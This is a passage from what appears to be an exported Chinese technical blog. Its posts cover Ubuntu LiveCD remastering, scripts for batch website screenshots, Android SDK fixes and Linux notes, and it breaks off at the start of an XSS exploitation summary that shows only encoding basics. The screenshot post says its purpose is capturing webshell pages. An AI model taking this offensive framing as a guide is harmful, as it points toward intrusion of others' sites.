squashfs-tools</code>即可。<br>之后再次运行<code>sudo /home/lub -b</code>，依提示运行，就能在用户文件夹下生成一个backup-2011.01.05的目录了，其中有的backup-2011.01.05.squashfs文件就是我们想要的。</p>\n<p>2.再将ubuntu-10.10-desktop-i386.iso拷贝到用户目录下，比如/home/jxg/下，执行<code>sudo mkdir /home/jxg/mnt</code>创建一个目录.<br>然后执行<code>sudo mount -o loop /home/jxg/ubuntu-10.10-desktop-i386.iso /home/jxg/mnt</code>，将ISO挂载到/home/jxg/mnt下.<br>然后用执行<code>sudo mkdri /home/jxg/livecd</code>创建一个livecd的工作目录<br>再用<code>sudo rsync --exclude=/home/jxg/mnt/casper/filesystem.squashfs -a /home/jxg/mnt/ /home/jxg/livecd</code>将/home/jxg/mnt下的内容除了casper/filesystem.squashfs，同步到了/home/jxg/livecd目录下.下面，我们要对/home/jxg/livecd/casper/目录下的filesystem.squashfs、 filesystem.manifest、filesystem.manifest-desktop这三个文件进行操作，由于它们只有读权限，所以先执行<code>sudo chmod o+w /home/jxg/livecd/casper/filesystem.*</code><br>将刚才lub生成的那个backup-2011.01.05.squashfs文件，拷贝成/home/jxg/livecd/casper/filesystem.squashfs<br>执行：<code>sudo cp /home/jxg/backup-2011.01.05/backup2011.01.05.squashfs /home/jxg/livecd/casper/filesystem.squashfs</code><br>此外，还要更新/home/jxg/livecd/casper/目录下的filesystem.manifest和filesystem.manifest-desktop，这两个文件实际上是系统所装包的列表，通过以下方式更新<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dpkg <span class=\"operator\">-l</span> | grep ii | awk <span class=\"string\">'&#123;print $2,$3&#125;'</span> &gt; /home/jxg/livecd/casper/filesystem.manifest</span><br><span class=\"line\">sudo dpkg <span class=\"operator\">-l</span> | grep ii | awk <span class=\"string\">'&#123;print $2,$3&#125;'</span> &gt; /home/jxg/livecd/casper/filesystem.manifest-desktop</span><br></pre></td></tr></table></figure></p>\n<p>实际上filesystem.manifest-desktop和filesystem.manifest是有所不同的，主要是少了 ubiquity casper live-initramfs user-setup discover1 xresprobe os-prober libdebian-installer4 这几个包，我们这里忽略了这些影响。</p>\n<p>3.退回的LiveCD的工作目录 /home/jxg/livecd 下，执行<code>sudo rm md5sum.txt</code><br>再执行<code>find -type f -print0 | sudo xargs -0 md5sum | grep -v ./isolinux/ | grep -v ./md5sum.txt | sudo tee md5sum.txt</code>,更新原来的md5sum。 </p>\n<p>4.将工作目录下的内容打包成ISO<br>先运行<code>sudo apt-get install mkisofs</code>安装ISO打包工具，<br>执行<code>sudo mkisofs -D -r -V &quot;$IMAGE_NAME&quot; -cache-inodes -J -l -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -o ../ubuntu-jxg-test.iso</code><br>这个一定要在工作目录的跟下执行，并且命令最后的’.’一定不要忘记。命令完成后，就可以在上一级的目录下发现ubuntu-jxg-test.iso文件了。</p>\n"},{"title":"批量网站截图","url":"http://ohroot.com/2014/10/08/批量网站截图/","content":"<p>在批量网站处理过程中，我们时常会需要打开大量的页面，查看页面内容是否是我们需要的。这种需求下，本文就主要研究懒人的处理技巧。<br><a id=\"more\"></a></p>\n<h2 id=\"python批量打开网页\">python批量打开网页</h2><p>本程序主要用于调用chrome浏览器，当然也可以修改源代码，支持其他浏览器，来批量打开浏览器，用户只需要查看后再关闭页面，即可实现批量网页查看的功能。具体代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#coding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> webbrowser</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">path = <span class=\"string\">'./url.txt'</span></span><br><span class=\"line\">myUrlFile = open(path)</span><br><span class=\"line\">filelist = myUrlFile.readlines()</span><br><span class=\"line\"></span><br><span class=\"line\">chromePath = <span class=\"string\">r'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'</span></span><br><span class=\"line\">webbrowser.register(<span class=\"string\">'chrome'</span>, <span class=\"keyword\">None</span>, webbrowser.BackgroundBrowser(chromePath))</span><br><span class=\"line\">count = <span class=\"number\">0</span></span><br><span class=\"line\">namecount = <span class=\"number\">0</span></span><br><span class=\"line\">dealcount = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> filelist:</span><br><span class=\"line\">    count = count + <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (count % <span class=\"number\">5</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        keyput = raw_input(<span class=\"string\">'Press any key to continue:'</span>);</span><br><span class=\"line\">    webbrowser.get(<span class=\"string\">'chrome'</span>).open_new_tab(s.strip())</span><br><span class=\"line\">myUrlFile.close()</span><br></pre></td></tr></table></figure>\n<h2 id=\"python网页截图\">python网页截图</h2><p>上面是python打开批量网页，懒人就是要突出一个懒，我还是觉得很麻烦，于是我想实现批量给这些网页截图，然后保存成一个页面，然后直接翻页查看。<br>linux下面有一个工具实现了这个功能，叫做Peepingtom，这里就不详细介绍这个软件了，经过本人实测，速度不是很满意，也有可能姿势不对。<br>于是我就琢磨着自己写一个啊，在网上找啊找，招到了如下三个脚本的实现方式，其实也就是两种思路，效果一样，差强人意。排除时间因素，他们还是蛮不错的，但是对于批量网站这种需求，该方案还是不行啊。这里列举其代码如下，代码中留有原作者信息。</p>\n<h3 id=\"实现方式一\">实现方式一</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\">browser = webdriver.Firefox()</span><br><span class=\"line\">browser.set_window_size(<span class=\"number\">1055</span>, <span class=\"number\">800</span>)</span><br><span class=\"line\">browser.get(<span class=\"string\">\"http://www.yooli.com/\"</span>)</span><br><span class=\"line\">browser.find_element_by_id(<span class=\"string\">\"idClose\"</span>).click()</span><br><span class=\"line\"><span class=\"comment\">#time.sleep(5)</span></span><br><span class=\"line\">browser.save_screenshot(<span class=\"string\">\"shot.png\"</span>)</span><br><span class=\"line\">browser.quit()</span><br></pre></td></tr></table></figure>\n<h3 id=\"实现方式二\">实现方式二</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 来源 http://www.oschina.net/code/snippet_219811_14920</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os.path</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyQt4 <span class=\"keyword\">import</span> QtGui,QtCore,QtWebKit</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PageShotter</span><span class=\"params\">(QtGui.QWidget)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,url,filename,parent=None)</span>:</span></span><br><span class=\"line\">        QtGui.QWidget.__init__(self,parent)</span><br><span class=\"line\">        self.url = url</span><br><span class=\"line\">        self.filename = filename</span><br><span class=\"line\">        self.webpage = <span class=\"keyword\">None</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">shot</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        webview = QtWebKit.QWebView(self)</span><br><span class=\"line\">        webview.load(QtCore.QUrl(self.url))</span><br><span class=\"line\">        self.webpage = webview.page()</span><br><span class=\"line\">        self.connect(webview,QtCore.SIGNAL(<span class=\"string\">\"loadFinished(bool)\"</span>),self.save_page)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">save_page</span><span class=\"params\">(self,finished)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\">#print finished</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> finished:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">u\"开始截图！\"</span></span><br><span class=\"line\">            size = self.webpage.mainFrame().contentsSize()</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">u\"页面宽：%d，页面高：%d\"</span> % (size.width(),size.height())</span><br><span class=\"line\">            self.webpage.setViewportSize(QtCore.QSize(size.width()+<span class=\"number\">16</span>,size.height()))</span><br><span class=\"line\">            img = QtGui.QImage(size, QtGui.QImage.Format_ARGB32)</span><br><span class=\"line\">            painter = QtGui.QPainter(img)</span><br><span class=\"line\">            self.webpage.mainFrame().render(painter)</span><br><span class=\"line\">            painter.end()</span><br><span class=\"line\">            filename= self.filename;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> img.save(filename):</span><br><span class=\"line\">                filepath = os.path.join(os.path.dirname(__file__), filename)</span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">u\"截图完毕：%s\"</span> % filepath</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">u\"截图失败\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">u\"网页加载失败！\"</span></span><br><span class=\"line\">        self.close()</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app = QtGui.QApplication(sys.argv)</span><br><span class=\"line\">    <span class=\"comment\">#shotter = PageShotter(\"http://www.adssfwewfdsfdsf.com\")</span></span><br><span class=\"line\">    shotter = PageShotter(<span class=\"string\">\"http://www.youku.com/\"</span>, <span class=\"string\">'shot.png'</span>)</span><br><span class=\"line\">    shotter.shot()</span><br><span class=\"line\">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>\n<h3 id=\"实现方式三\">实现方式三</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># author: oldj &lt;oldj.wu@gmail.com&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># blog: http://oldj.net</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">capture</span><span class=\"params\">(url, save_fn=<span class=\"string\">\"capture.png\"</span>)</span>:</span></span><br><span class=\"line\">    browser = webdriver.Firefox() <span class=\"comment\"># Get local session of firefox</span></span><br><span class=\"line\">    browser.set_window_size(<span class=\"number\">1200</span>, <span class=\"number\">900</span>)</span><br><span class=\"line\">    browser.get(url) <span class=\"comment\"># Load page</span></span><br><span class=\"line\">    browser.execute_script(<span class=\"string\">\"\"\"</span><br><span class=\"line\">        (function () &#123;</span><br><span class=\"line\">            var y = 0;</span><br><span class=\"line\">            var step = 100;</span><br><span class=\"line\">            window.scroll(0, 0);</span><br><span class=\"line\">            function f() &#123;</span><br><span class=\"line\">                if (y &lt; document.body.scrollHeight) &#123;</span><br><span class=\"line\">                    y += step;</span><br><span class=\"line\">                    window.scroll(0, y);</span><br><span class=\"line\">                    setTimeout(f, 50);</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    window.scroll(0, 0);</span><br><span class=\"line\">                    document.title += \"scroll-done\";</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">            setTimeout(f, 1000);</span><br><span class=\"line\">        &#125;)();</span><br><span class=\"line\">    \"\"\"</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">30</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"scroll-done\"</span> <span class=\"keyword\">in</span> browser.title:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">    browser.save_screenshot(save_fn)</span><br><span class=\"line\">    browser.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    capture(<span class=\"string\">\"http://www.taobao.com\"</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"Javascript网页截图\">Javascript网页截图</h2><p>后来我又仔细的思考了下，要实现网页截图，对页面的渲染是必不可少的，要么我们借助于webkit引擎（事实上，上面的python脚本基本原理就是那样的），但是实际测试效果不是非常好，要么我们自己写一个渲染的引擎，显然这不现实，或者说没有必要。最好的方法就是利用现有的chrome或者firefox帮助我们实现，于是我想通过JS来实现网页截图</p>\n<p>基本原理是我们通过<a href=\"https://github.com/niklasvh/html2canvas\" target=\"_blank\" rel=\"external\">html2canvas</a>将要截取的页面元素保存成canvas对象，然后通过<a href=\"https://github.com/hongru/canvas2image\" target=\"_blank\" rel=\"external\">canvas2image.js</a>将页面保存成本地图片。测试代码如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"doctype\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">html</span> <span class=\"attribute\">lang</span>=<span class=\"value\">\"zh-CN\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">meta</span> <span class=\"attribute\">http-equiv</span>=<span class=\"value\">\"Content-Type\"</span> <span class=\"attribute\">content</span>=<span class=\"value\">\"text/html; charset=UTF-8\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">script</span> <span class=\"attribute\">src</span>=<span class=\"value\">\"./html2canvas.js\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"title\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">script</span> <span class=\"attribute\">src</span>=<span class=\"value\">\"./canvas2image.js\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"title\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">script</span> <span class=\"attribute\">type</span>=<span class=\"value\">\"text/javascript\"</span>&gt;</span><span class=\"javascript\"></span><br><span class=\"line\">    (<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">window</span>.onload = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">            html2canvas(<span class=\"built_in\">document</span>.body, &#123;</span><br><span class=\"line\">                onrendered: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(canvas)</span> </span>&#123;</span><br><span class=\"line\">                    <span class=\"built_in\">document</span>.body.appendChild( canvas );</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> strDataURI = canvas.toDataURL();</span><br><span class=\"line\">                    Canvas2Image.saveAsPNG(canvas); </span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;)();</span><br><span class=\"line\"></span><span class=\"tag\">&lt;/<span class=\"title\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">p</span>&gt;</span>这里是测试内容，这里是测试内容，这里是测试内容，这里是测试内容。<span class=\"tag\">&lt;/<span class=\"title\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>说明：页面中要引入那两个JS</p>\n<p>测试代码就写到这里，很多人说这种方法不支持跨域的图片截图问题，我也没有深入去研究，毕竟我的主要用途是截取webshell页面，基本不存在跨域问题。具体实现上可能还需要使用chrome插件的方式，留待后续研究吧。</p>\n"},{"title":"ubuntu下Android开发问题汇总","url":"http://ohroot.com/2014/09/28/ubuntu下Android开发问题汇总/","content":"<p>本文主要关注ubuntu下Android开发，时的一些小问题，探索解决方案<br><a id=\"more\"></a></p>\n<ol>\n<li><p>问题描述<code>/home/leon/&lt;span style=&quot;font-family: Arial, Helvetica, sans-serif;&quot;&gt;develop/android-sdk-linux/&lt;/span&gt;platform-tools/aapt: error while loading shared libraries: libz.so.1: cannot open shared object file: No such file or directory</code><br>其实这个问题就是你64位的操作系统没有32位的类库,而android的SDK是要32位支持的,如果没装就只能是报上面的错!<br>打开终端运行下面的命令: <code>sudo apt-get install ia32-libs</code> 如果出现什么包含在别的什么包里，把那些包都安装了就好了</p>\n</li>\n<li><p>问题描述<code>/home/leon/develop/android-sdk-linux/build-tools/19.0.1/aapt: error while loading shared libraries: libstdc++.so.6: cannot open shared object file: No such file or directory</code><br>解决方法：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install libstdc++<span class=\"number\">6</span>   </span><br><span class=\"line\">sudo apt-get install lib32stdc++<span class=\"number\">6</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n"},{"title":"linux入门笔记","url":"http://ohroot.com/2014/09/28/linux入门笔记/","content":"<p>Linux方面，我一直是个新手，知识不断积累吧，一些小东西记录下<br><a id=\"more\"></a></p>\n<p>本文比较杂乱，全是一些手记，没啥技术含量，新手刚玩ubuntu可以看看，老鸟自行绕过</p>\n<ul>\n<li><p>启用root帐号 <code>sudo passwd root</code></p>\n</li>\n<li><p>编辑源 <code>sudo gedit /etc/apt/sources.list</code></p>\n</li>\n<li><p>goagent安装配置 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install python-dev</span><br><span class=\"line\">sudo apt-get install python-gevent</span><br><span class=\"line\"><span class=\"comment\">#Ubuntu 添加源 `` </span></span><br><span class=\"line\">deb http://cz.archive.ubuntu.com/ubuntu precise main  </span><br><span class=\"line\">sudo apt-get update  </span><br><span class=\"line\">apt-get install python-vte</span><br></pre></td></tr></table></figure>\n<p>如果proxy.py中出现UnicodeDecodeError则添加下列代码</p>\n<figure class=\"highlight axapta\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reload(sys) <span class=\"preprocessor\"># Python2.5 初始化后会删除 sys.setdefaultencoding 这个方法，我们需要重新载入     </span></span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'utf-8'</span>)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装sublime Text 3</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:webupd8team/sublime-text-<span class=\"number\">3</span>  </span><br><span class=\"line\">sudo apt-get update  </span><br><span class=\"line\">sudo apt-get install sublime-text-installer</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装Komodo Edit</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:mystic-mirage/komodo-edit  </span><br><span class=\"line\">sudo apt-get update  </span><br><span class=\"line\">sudo apt-get install komodo-edit</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>通过PPA在Ubuntu上安装Atom：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:webupd8team/atom  </span><br><span class=\"line\">sudo apt-get update   </span><br><span class=\"line\">sudo apt-get install atom</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装deb软件-&gt;飞秋 <code>sudo dpkg -i iptux.deb</code></p>\n</li>\n</ul>\n<p>dpkg命令常用格式如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dpkg -I iptux.deb<span class=\"comment\">#查看iptux.deb软件包的详细信息，包括软件名称、版本以及大小等（其中-I等价于--info）</span></span><br><span class=\"line\">sudo dpkg -c iptux.deb<span class=\"comment\">#查看iptux.deb软件包中包含的文件结构（其中-c等价于--contents）</span></span><br><span class=\"line\">sudo dpkg -i iptux.deb<span class=\"comment\">#安装iptux.deb软件包（其中-i等价于--install）</span></span><br><span class=\"line\">sudo dpkg <span class=\"operator\">-l</span> iptux<span class=\"comment\">#查看iptux软件包的信息（软件名称可通过dpkg -I命令查看，其中-l等价于--list）</span></span><br><span class=\"line\">sudo dpkg -L iptux<span class=\"comment\">#查看iptux软件包安装的所有文件（软件名称可通过dpkg -I命令查看，其中-L等价于--listfiles）</span></span><br><span class=\"line\">sudo dpkg <span class=\"operator\">-s</span> iptux<span class=\"comment\">#查看iptux软件包的详细信息（软件名称可通过dpkg -I命令查看，其中-s等价于--status）</span></span><br><span class=\"line\">sudo dpkg -r iptux<span class=\"comment\">#卸载iptux软件包（软件名称可通过dpkg -I命令查看，其中-r等价于--remove）</span></span><br></pre></td></tr></table></figure></p>\n<p>注：dpkg命令无法自动解决依赖关系。如果安装的deb包存在依赖包，则应避免使用此命令，或者按照依赖关系顺序安装依赖包。</p>\n<p>linux安装搜狗输入法问题,安装好系统首先解决下语言支持问题，然后输入法可以参照这两篇文章：</p>\n<p> <a href=\"http://blog.csdn.net/ethan706/article/details/38895675\" target=\"_blank\" rel=\"external\">Ubuntu14.04安装搜狗输入法的问题</a><br> <a href=\"http://blog.csdn.net/ljgstudy/article/details/27686471\" target=\"_blank\" rel=\"external\">Ubuntu14.04安装搜狗输入法的一点小问题</a></p>\n<p>弄完了发现系统设置不完整了，输入法中英文切换也有问题。查了下，发现是卸载了ibus的原因，其实安装搜狗拼音可以不卸载ibus，网上各种教程坑人的多啊，我们需要把<code>unity-control-center</code>,直接apt-get安装就好了。</p>\n"},{"title":"XSS相关技术总结","url":"http://ohroot.com/2014/09/22/XSS相关技术总结/","content":"<p>关于XSS自己也学习了不少了，本文主要把一些XSS构造利用方面的技术总结下吧，本文参考了很多，如有雷同。算我抄你的。<br><a id=\"more\"></a></p>\n<h2 id=\"常用编码\"><strong>常用编码</strong></h2><h3 id=\"URL编码\"><strong>URL编码</strong></h3><p>一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为<code>%2F</code>，“%”的URL编码为<code>%25</code></p>\n<h3 id=\"HTML实体编码\"><strong>HTML实体编码</strong></h3><p>以&amp;开头，分号结尾的，例如“&lt;”的编码是<code>&amp;lt;</code>空格为<code>&amp;nbsp;</code></p>\n<h3 id=\"字符编码\"><strong>字符编码</strong></h3><p>十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值;”。</p>\n<p>例如“&lt;”可以编码十进制字符编码：<code>&amp;#060;</code>,十六进制：<code>&amp;#x3c;</code>,unicode字符编码格式为：<code>&amp;#0060</code>;</p>\n<h3 id=\"JS编码\"><strong>JS编码</strong></h3><p>js提供了四种字符编码的策略</p>\n<ul>\n<li>三个八进制数字，如果不够个数，前面补0，例如“e”编码为<code>\\145</code></li>\n<li>两个十六进制数字，如果不够个数，前面补0，例如“e”编码为<code>\\x65</code></li>\n<li>四个十六进制数字，如果不够个数，前面补0，例如“e”编码为<code>\\u0065</code></li>\n<li>对于一些控制字符，使用特殊的C类型的转义风格（例如<code>\\n</code>和<code>\\r</code>）</li>\n</ul>\n<h3 